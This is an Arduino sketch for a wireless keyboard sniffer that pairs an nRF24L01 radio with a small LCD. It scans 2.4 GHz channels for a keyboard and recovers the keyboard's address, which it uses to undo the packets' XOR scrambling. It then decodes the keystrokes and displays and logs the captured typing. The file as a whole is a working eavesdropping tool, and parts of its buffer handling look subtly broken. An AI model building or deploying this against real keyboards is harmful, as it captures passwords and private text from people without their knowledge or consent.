#include <EEPROM.h>
#include <SPI.h>
#include "mhid.h"
#include "nRF24L01.h"
#include "RF24.h"

#define DEBUG
#define RADIO_PIN_CE 9
#define RADIO_PIN_CSN 10
#define LCD_PIN_SCE   7 //Pin 3 on LCD
#define LCD_PIN_RESET 6 //Pin 4 on LCD
#define LCD_PIN_DC    5 //Pin 5 on LCD
#define LCD_PIN_SDIN  4 //Pin 6 on LCD
#define LCD_PIN_SCLK  3 //Pin 7 on LCD
#define LCD_COMMAND 0 
#define LCD_DATA  1
#define LCD_X     84
#define LCD_Y     48
#define LCD_CHARACTER_WIDTH	7 // Includes 1 line padding
#define LCD_CHARACTER_HEIGHT	8
#define SERIAL_BAUDRATE 115200
#define EEPROM_LAST_CHANNEL_VALUE_ADDRESS  0x05 
#define RADIO_PACKET_SIZE 16
#define MODE_INTRODUCTION 1
#define MODE_SCANNING 2
#define MODE_READING 3
#define MODE_STATUS 4

//This table contains the hex values that represent pixels
//for a font that is 5 pixels wide and 8 pixels high
static const byte ASCII[][5] = {
  {0x00, 0x00, 0x00, 0x00, 0x00} // 20  
  ,{0x00, 0x00, 0x5f, 0x00, 0x00} // 21 !
  ,{0x00, 0x07, 0x00, 0x07, 0x00} // 22 "
  ,{0x14, 0x7f, 0x14, 0x7f, 0x14} // 23 #
  ,{0x24, 0x2a, 0x7f, 0x2a, 0x12} // 24 $
  ,{0x23, 0x13, 0x08, 0x64, 0x62} // 25 %
  ,{0x36, 0x49, 0x55, 0x22, 0x50} // 26 &
  ,{0x00, 0x05, 0x03, 0x00, 0x00} // 27 '
  ,{0x00, 0x1c, 0x22, 0x41, 0x00} // 28 (
  ,{0x00, 0x41, 0x22, 0x1c, 0x00} // 29 )
  ,{0x14, 0x08, 0x3e, 0x08, 0x14} // 2a *
  ,{0x08, 0x08, 0x3e, 0x08, 0x08} // 2b +
  ,{0x00, 0x50, 0x30, 0x00, 0x00} // 2c ,
  ,{0x08, 0x08, 0x08, 0x08, 0x08} // 2d -
  ,{0x00, 0x60, 0x60, 0x00, 0x00} // 2e .
  ,{0x20, 0x10, 0x08, 0x04, 0x02} // 2f /
  ,{0x3e, 0x51, 0x49, 0x45, 0x3e} // 30 0
  ,{0x00, 0x42, 0x7f, 0x40, 0x00} // 31 1
  ,{0x42, 0x61, 0x51, 0x49, 0x46} // 32 2
  ,{0x21, 0x41, 0x45, 0x4b, 0x31} // 33 3
  ,{0x18, 0x14, 0x12, 0x7f, 0x10} // 34 4
  ,{0x27, 0x45, 0x45, 0x45, 0x39} // 35 5
  ,{0x3c, 0x4a, 0x49, 0x49, 0x30} // 36 6
  ,{0x01, 0x71, 0x09, 0x05, 0x03} // 37 7
  ,{0x36, 0x49, 0x49, 0x49, 0x36} // 38 8
  ,{0x06, 0x49, 0x49, 0x29, 0x1e} // 39 9
  ,{0x00, 0x36, 0x36, 0x00, 0x00} // 3a :
  ,{0x00, 0x56, 0x36, 0x00, 0x00} // 3b ;
  ,{0x08, 0x14, 0x22, 0x41, 0x00} // 3c <
  ,{0x14, 0x14, 0x14, 0x14, 0x14} // 3d =
  ,{0x00, 0x41, 0x22, 0x14, 0x08} // 3e >
  ,{0x02, 0x01, 0x51, 0x09, 0x06} // 3f ?
  ,{0x32, 0x49, 0x79, 0x41, 0x3e} // 40 @
  ,{0x7e, 0x11, 0x11, 0x11, 0x7e} // 41 A
  ,{0x7f, 0x49, 0x49, 0x49, 0x36} // 42 B
  ,{0x3e, 0x41, 0x41, 0x41, 0x22} // 43 C
  ,{0x7f, 0x41, 0x41, 0x22, 0x1c} // 44 D
  ,{0x7f, 0x49, 0x49, 0x49, 0x41} // 45 E
  ,{0x7f, 0x09, 0x09, 0x09, 0x01} // 46 F
  ,{0x3e, 0x41, 0x49, 0x49, 0x7a} // 47 G
  ,{0x7f, 0x08, 0x08, 0x08, 0x7f} // 48 H
  ,{0x00, 0x41, 0x7f, 0x41, 0x00} // 49 I
  ,{0x20, 0x40, 0x41, 0x3f, 0x01} // 4a J
  ,{0x7f, 0x08, 0x14, 0x22, 0x41} // 4b K
  ,{0x7f, 0x40, 0x40, 0x40, 0x40} // 4c L
  ,{0x7f, 0x02, 0x0c, 0x02, 0x7f} // 4d M
  ,{0x7f, 0x04, 0x08, 0x10, 0x7f} // 4e N
  ,{0x3e, 0x41, 0x41, 0x41, 0x3e} // 4f O
  ,{0x7f, 0x09, 0x09, 0x09, 0x06} // 50 P
  ,{0x3e, 0x41, 0x51, 0x21, 0x5e} // 51 Q
  ,{0x7f, 0x09, 0x19, 0x29, 0x46} // 52 R
  ,{0x46, 0x49, 0x49, 0x49, 0x31} // 53 S
  ,{0x01, 0x01, 0x7f, 0x01, 0x01} // 54 T
  ,{0x3f, 0x40, 0x40, 0x40, 0x3f} // 55 U
  ,{0x1f, 0x20, 0x40, 0x20, 0x1f} // 56 V
  ,{0x3f, 0x40, 0x38, 0x40, 0x3f} // 57 W
  ,{0x63, 0x14, 0x08, 0x14, 0x63} // 58 X
  ,{0x07, 0x08, 0x70, 0x08, 0x07} // 59 Y
  ,{0x61, 0x51, 0x49, 0x45, 0x43} // 5a Z
  ,{0x00, 0x7f, 0x41, 0x41, 0x00} // 5b [
  ,{0x02, 0x04, 0x08, 0x10, 0x20} // 5c \
  ,{0x00, 0x41, 0x41, 0x7f, 0x00} // 5d ]
  ,{0x04, 0x02, 0x01, 0x02, 0x04} // 5e ^
  ,{0x40, 0x40, 0x40, 0x40, 0x40} // 5f _
  ,{0x00, 0x01, 0x02, 0x04, 0x00} // 60 `
  ,{0x20, 0x54, 0x54, 0x54, 0x78} // 61 a
  ,{0x7f, 0x48, 0x44, 0x44, 0x38} // 62 b
  ,{0x38, 0x44, 0x44, 0x44, 0x20} // 63 c
  ,{0x38, 0x44, 0x44, 0x48, 0x7f} // 64 d
  ,{0x38, 0x54, 0x54, 0x54, 0x18} // 65 e
  ,{0x08, 0x7e, 0x09, 0x01, 0x02} // 66 f
  ,{0x0c, 0x52, 0x52, 0x52, 0x3e} // 67 g
  ,{0x7f, 0x08, 0x04, 0x04, 0x78} // 68 h
  ,{0x00, 0x44, 0x7d, 0x40, 0x00} // 69 i
  ,{0x20, 0x40, 0x44, 0x3d, 0x00} // 6a j 
  ,{0x7f, 0x10, 0x28, 0x44, 0x00} // 6b k
  ,{0x00, 0x41, 0x7f, 0x40, 0x00} // 6c l
  ,{0x7c, 0x04, 0x18, 0x04, 0x78} // 6d m
  ,{0x7c, 0x08, 0x04, 0x04, 0x78} // 6e n
  ,{0x38, 0x44, 0x44, 0x44, 0x38} // 6f o
  ,{0x7c, 0x14, 0x14, 0x14, 0x08} // 70 p
  ,{0x08, 0x14, 0x14, 0x18, 0x7c} // 71 q
  ,{0x7c, 0x08, 0x04, 0x04, 0x08} // 72 r
  ,{0x48, 0x54, 0x54, 0x54, 0x20} // 73 s
  ,{0x04, 0x3f, 0x44, 0x40, 0x20} // 74 t
  ,{0x3c, 0x40, 0x40, 0x20, 0x7c} // 75 u
  ,{0x1c, 0x20, 0x40, 0x20, 0x1c} // 76 v
  ,{0x3c, 0x40, 0x30, 0x40, 0x3c} // 77 w
  ,{0x44, 0x28, 0x10, 0x28, 0x44} // 78 x
  ,{0x0c, 0x50, 0x50, 0x50, 0x3c} // 79 y
  ,{0x44, 0x64, 0x54, 0x4c, 0x44} // 7a z
  ,{0x00, 0x08, 0x36, 0x41, 0x00} // 7b {
  ,{0x00, 0x00, 0x7f, 0x00, 0x00} // 7c |
  ,{0x00, 0x41, 0x36, 0x08, 0x00} // 7d }
  ,{0x10, 0x08, 0x08, 0x10, 0x08} // 7e ~
  ,{0x78, 0x46, 0x41, 0x46, 0x78} // 7f DEL
};

volatile char mode = MODE_INTRODUCTION;

uint8_t channel = 72; 
uint64_t keyboard_mac_address = 0;
RF24 radio(RADIO_PIN_CE, RADIO_PIN_CSN);
uint16_t total_packets_received_count = 0;
uint16_t total_characters_received_count = 0;

char lcd_display_character_buffer[6][12];
uint8_t lcd_display_character_buffer_current_line = 1;
uint8_t lcd_display_character_buffer_character_position = 1;

uint16_t radio_packet_last_sequence = 0;
uint16_t radio_last_letter_received = 0;
boolean radio_last_keytroke_was_on_single_line = false;

void decrypt_packet(uint8_t* p)
{
  for (int i = 4; i < 15; i++)
  {
    p[i] ^= keyboard_mac_address >> (((i - 4) % 5) * 8) & 0xFF;
  }
}

void process_packet(uint8_t* packet)
{
  total_packets_received_count++;
  if(mode == MODE_STATUS)
  {
    lcd_go_to_x_y(49,3);
	String packets_received_string = String(total_packets_received_count);
	char packets_received_char_buffer[packets_received_string.length()];
	packets_received_string.toCharArray(packets_received_char_buffer, packets_received_string.length());
	lcd_string(packets_received_char_buffer);
  }
  
  if(packet[0] != 0x0A) return; 
  if(packet[9] == 0) return;
  if(packet[1] != 0x78) return;
  
  uint16_t sequence = (packet[5] << 8) + packet[4];
  if (sequence == radio_packet_last_sequence) return;
  
  bool position_one_contains_valid_letter = false;
  bool position_two_contains_valid_letter = false;
  bool position_three_contains_valid_letter = false;
  char current_meta_value = packet[7];
  char current_key_position_one = packet[9];
  char current_key_position_two = packet[10];
  char current_key_position_three = packet[11];
  uint16_t current_letter_position_one = (current_meta_value << 8) + current_key_position_one;
  uint16_t current_letter_position_two = (current_meta_value << 8) + current_key_position_two;
  uint16_t current_letter_position_three = (current_meta_value << 8) + current_key_position_three;
  boolean current_key_is_on_single_line = current_key_position_two == 0 && current_key_position_three == 0;
  
  if(current_key_position_three != 0 && current_letter_position_three != radio_last_letter_received)
  {
    position_three_contains_valid_letter = true;
  }
  
  if(current_key_position_two != 0 && current_letter_position_two != radio_last_letter_received)
  {
    position_two_contains_valid_letter = true;
  }
  
  if(current_key_position_two == 0 || position_two_contains_valid_letter == true) // only pay attention if the character ahead in position two was not ignored
  {
    if(current_letter_position_one != radio_last_letter_received || (radio_last_keytroke_was_on_single_line == true && current_key_is_on_single_line == true))
    {
      position_one_contains_valid_letter = true;
    }
  }
  
  if(position_one_contains_valid_letter == true) process_letter(current_meta_value, current_key_position_one);
  if(position_two_contains_valid_letter == true) process_letter(current_meta_value, current_key_position_two);
  if(position_three_contains_valid_letter == true) process_letter(current_meta_value, current_key_position_three);
  
  radio_last_keytroke_was_on_single_line = current_key_is_on_single_line;
  radio_packet_last_sequence = sequence;
}

void process_letter(char meta_value, char key)
{
  total_characters_received_count++;
  if(mode == MODE_STATUS)
  {
    lcd_go_to_x_y(49,2);
	String characters_received_string = String(total_characters_received_count);
	char characters_received_char_buffer[characters_received_string.length()];
	characters_received_string.toCharArray(characters_received_char_buffer, characters_received_string.length());
	lcd_string(characters_received_char_buffer);
  }
  
  char letter = hid_decode(key, meta_value);
  radio_last_letter_received = (meta_value << 8) + key;
  
  #ifdef DEBUG
  Serial.print(letter);
  Serial.print("(");
  Serial.print(key, HEX);
  Serial.print(")");
  #endif
  
  if(lcd_display_character_buffer_character_position == sizeof(lcd_display_character_buffer[0]))
  {
	if(lcd_display_character_buffer_current_line == sizeof(lcd_display_character_buffer))
	{
	  for(int i=0; i < sizeof(lcd_display_character_buffer) - 1; i++) strcpy(lcd_display_character_buffer[i], lcd_display_character_buffer[i + 1]); 
	  strcpy(lcd_display_character_buffer[sizeof(lcd_display_character_buffer) - 1], "            ");
	  redraw_all_buffered_characters_to_screen();
	}
	else
	{
	  lcd_display_character_buffer_current_line++;
	}
	
	lcd_display_character_buffer_character_position = 1;
  }
  
  lcd_display_character_buffer[lcd_display_character_buffer_current_line - 1][lcd_display_character_buffer_character_position - 1] = letter;
  if(mode == MODE_READING)
  {
    lcd_go_to_x_y((lcd_display_character_buffer_character_position - 1) * LCD_CHARACTER_WIDTH, lcd_display_character_buffer_current_line - 1);
    lcd_character(letter);
  }
  lcd_display_character_buffer_character_position++;
}

void display_scanning_channel_on_lcd()
{
  lcd_clear();
  lcd_go_to_x_y(13, 1);
  lcd_string("Scanning");
  lcd_go_to_x_y(17, 2);
  lcd_string("channel");
  lcd_go_to_x_y(28, 3);
  lcd_string("24");
}

void display_update_scanning_channel_on_lcd(uint8_t channel)
{
  lcd_go_to_x_y(0, 1);
  char channel_text[4];
  String(channel).toCharArray(channel_text, 4);
  lcd_string(channel_text);
}

void display_status_static_text()
{
  lcd_clear();
  lcd_go_to_x_y(0, 1);
  lcd_string("0x");
  char hex_value[1];
  for(int i = 0; i < 5; i++)
  {
    uint8_t address_value = keyboard_mac_address >> 8;
    String(address_value, HEX).toCharArray(hex_value, 1);
    lcd_string(hex_value);
  }
  lcd_go_to_x_y(21, 2);
  lcd_string("CH:");
  lcd_go_to_x_y(49, 2);
  char channel_text[4];
  String(channel).toCharArray(channel_text, 4);
  lcd_string(channel_text);
  lcd_go_to_x_y(14, 3);
  lcd_string("PKT:");
  lcd_go_to_x_y(7, 4);
  lcd_string("CHAR	:");
}

void redraw_all_buffered_characters_to_screen()
{
  	for(int row = 0; row < sizeof(lcd_display_character_buffer); row++)
	{
      for(int column = 0; column < sizeof(lcd_display_character_buffer[0]); column++)
	  {
		char letter = lcd_display_character_buffer[row][column];
		lcd_go_to_x_y(column * LCD_CHARACTER_WIDTH, row);
        lcd_character(letter);
	  }
	}
}

uint8_t flush_rx(void)
{
  uint8_t status;
  digitalWrite(RADIO_PIN_CSN, LOW);
  status = SPI.transfer( FLUSH_RX );
  digitalWrite(RADIO_PIN_CSN, HIGH);
  return status;
}

uint8_t write_to_nrf24l01_register(uint8_t reg, uint8_t value)                                       
{
  uint8_t status;
  digitalWrite(RADIO_PIN_CSN, LOW);
  status = SPI.transfer( W_REGISTER | ( REGISTER_MASK & reg ) );
  SPI.transfer(value);
  digitalWrite(RADIO_PIN_CSN, HIGH);
  return status;
}

void debug_print_packet(uint8_t* packet)
{
  Serial.println("");
  Serial.print(millis());
  Serial.print(" | ");
  for (int j = 0; j < RADIO_PACKET_SIZE; j++)
  {
    Serial.print(" ");
    if(packet[j] <= 0xF) Serial.print(" ");
    Serial.print(packet[j], HEX);
    Serial.print(" |");
  }
}

void scan()
{
  mode = MODE_SCANNING;
  keyboard_mac_address = 0xAALL;
  uint8_t packet[RADIO_PACKET_SIZE];
  write_to_nrf24l01_register(0x02, 0x00);  // RF24 doesn't ever fully set this -- only certain bits of it
  write_to_nrf24l01_register(0x03, 0x00); // SETUP_AW - change address width to be 2 bytes [Page 54]
  radio.openReadingPipe(0, keyboard_mac_address);
  radio.disableCRC();
  radio.startListening();
  unsigned long channel_start_scan_time;
  display_scanning_channel_on_lcd();
  
  while (1)
  {
    if (channel > 80)
      channel = 3;
    #ifdef DEBUG
    Serial.println("");
    Serial.print("Scanning channel ");
    Serial.print(2400 + channel);
    Serial.print(".");
	#endif
    radio.setChannel(channel);
    display_update_scanning_channel_on_lcd(channel);
	
    channel_start_scan_time = millis();
    while (millis() - channel_start_scan_time < 1000)
    {      
      if(radio.available())
      {
        radio.read(&packet, RADIO_PACKET_SIZE);
        
        if (packet[4] == 0xCD)
        {
		  #ifdef DEBUG
          debug_print_packet(packet);
          #endif
          // The data returned starts with the packet control field (PCF) which is 9 bits long [Page 25].
          // So our packet begins 9 bits in after the 5 byte mac. 
          // Everything is misaligned by 1 bit (due to PCF being 9 bits) so we have to shift everything 1 bit when comparing.
          // We remove the MSB (0x7F = 127) (last bit of the PCF) and check if the device type is 0x0A which is a keyboard. See http://farm6.static.flickr.com/5002/5354354594_f7bf64f3af.jpg
          if ((packet[6] & 0x7F) << 1 == 0x0A)
          { 
            // Check if the packet type is 0x78 which is a keystroke or 0x38 which is idle (key is held down). 
            if (packet[7] << 1 == 0x38 || packet[7] << 1 == 0x78) 
            {
			  #ifdef DEBUG
              Serial.println("");
              Serial.print("Keyboard on channel ");
              Serial.print(channel);
              Serial.print(".");
			  #endif
              EEPROM.write(EEPROM_LAST_CHANNEL_VALUE_ADDRESS, channel);

              keyboard_mac_address = 0;
              for (int i = 0; i < 4; i++)
              {
                keyboard_mac_address += packet[i];
                keyboard_mac_address <<= 8;
              }
              keyboard_mac_address += packet[4]; // We know the first byte is 0xCD (Note: addressing is LSB first).
              #ifdef DEBUG
			  Serial.print(" (Mac Address: ");
              Serial.print(packet[0], HEX);
              Serial.print(packet[1], HEX);
              Serial.print(packet[2], HEX);
              Serial.print(packet[3], HEX);
              Serial.print(packet[4], HEX);
              Serial.print(")");
			  #endif
              write_to_nrf24l01_register(0x03, 0x03);  // SETUP_AW - change address width back to be 5 bytes [Page 54]
              return;
            }
          }
        }
      }
    }
    channel++;
  }
}

void initialize_radio_and_lcd()
{
  lcd_init();
  Serial.begin(SERIAL_BAUDRATE);
  radio.begin();
  channel = EEPROM.read(EEPROM_LAST_CHANNEL_VALUE_ADDRESS);
  radio.setAutoAck(false);
  radio.setPALevel(RF24_PA_MIN); 
  radio.setDataRate(RF24_2MBPS);
  radio.setPayloadSize(32);
  radio.setChannel(channel);
}

void setup_radio_for_reading()
{
  mode = MODE_READING;
  radio.enableDynamicPayloads();
  radio.setCRCLength(RF24_CRC_16);
  radio.stopListening();
  radio.openReadingPipe(1, keyboard_mac_address);
  radio.startListening();
}

void display_introduction_on_lcd()
{
  mode = MODE_INTRODUCTION;
}

void setup()
{
  initialize_radio_and_lcd();
  attachInterrupt(1, mode_button_pressed, FALLING);
  display_introduction_on_lcd();
  scan();
  setup_radio_for_reading();
}

void mode_button_pressed()
{
  if(mode == MODE_READING)
  {
    mode = MODE_STATUS;
	display_status_static_text();
  }
  else if(mode == MODE_STATUS)
  {
    mode = MODE_READING;
	redraw_all_buffered_characters_to_screen();
  }
}

void loop(void)
{
  uint8_t pipe_num;

  if (radio.available(&pipe_num))
  {
    uint8_t current_packet[RADIO_PACKET_SIZE];
    uint8_t payload_size = radio.getDynamicPayloadSize();
    radio.read(&current_packet, RADIO_PACKET_SIZE);
    flush_rx();
    
    decrypt_packet(current_packet);
	#ifdef DEBUG
    debug_print_packet(current_packet);
	#endif
    process_packet(current_packet);
  }
}

void lcd_go_to_x_y(int x, int y) {
  lcd_write(0, 0x80 | x);  // Column.
  lcd_write(0, 0x40 | y);  // Row.  ?
}

//This takes a large array of bits and sends them to the LCD
void lcd_bitmap(char my_array[]){
  for (int index = 0 ; index < (LCD_X * LCD_Y / 8) ; index++)
    lcd_write(LCD_DATA, my_array[index]);
}

//This function takes in a character, looks it up in the font table/array
//And writes it to the screen
//Each character is 8 bits tall and 5 bits wide. We pad one blank column of
//pixels on each side of the character for readability.
void lcd_character(char character) {
  if(character < 0x20) character = 0x3f;
  
  lcd_write(LCD_DATA, 0x00); //Blank vertical line padding

  for (int index = 0 ; index < 5 ; index++)
    lcd_write(LCD_DATA, ASCII[character - 0x20][index]);
    //0x20 is the ASCII character for Space (' '). The font table starts with this character

  lcd_write(LCD_DATA, 0x00); //Blank vertical line padding
}

//Given a string of characters, one by one is passed to the LCD
void lcd_string(char *characters) {
  while (*characters)
    lcd_character(*characters++);
}

//Clears the LCD by writing zeros to the entire screen
void lcd_clear(void) {
  for (int index = 0 ; index < (LCD_X * LCD_Y / 8) ; index++)
    lcd_write(LCD_DATA, 0x00);
    
  lcd_go_to_x_y(0, 0); //After we clear the display, return to the home position
}

//This sends the magical commands to the PCD8544
void lcd_init(void) {

  //Configure control pins
  pinMode(LCD_PIN_SCE, OUTPUT);
  pinMode(LCD_PIN_RESET, OUTPUT);
  pinMode(LCD_PIN_DC, OUTPUT);
  pinMode(LCD_PIN_SDIN, OUTPUT);
  pinMode(LCD_PIN_SCLK, OUTPUT);

  //Reset the LCD to a known state
  digitalWrite(LCD_PIN_RESET, LOW);
  digitalWrite(LCD_PIN_RESET, HIGH);

  lcd_write(LCD_COMMAND, 0x21); //Tell LCD that extended commands follow
  lcd_write(LCD_COMMAND, 0xB0); //Set LCD Vop (Contrast): Try 0xB1(good @ 3.3V) or 0xBF if your display is too dark
  lcd_write(LCD_COMMAND, 0x04); //Set Temp coefficent
  lcd_write(LCD_COMMAND, 0x14); //LCD bias mode 1:48: Try 0x13 or 0x14

  lcd_write(LCD_COMMAND, 0x20); //We must send 0x20 before modifying the display control mode
  lcd_write(LCD_COMMAND, 0x0C); //Set display control, normal mode. 0x0D for inverse
}

//There are two memory banks in the LCD, data/RAM and commands. This 
//function sets the DC pin high or low depending, and then sends
//the data byte
void lcd_write(byte data_or_command, byte data) {
  digitalWrite(LCD_PIN_DC, data_or_command); //Tell the LCD that we are writing either to data or a command

  //Send the data
  digitalWrite(LCD_PIN_SCE, LOW);
  shiftOut(LCD_PIN_SDIN, LCD_PIN_SCLK, MSBFIRST, data);
  digitalWrite(LCD_PIN_SCE, HIGH);
}
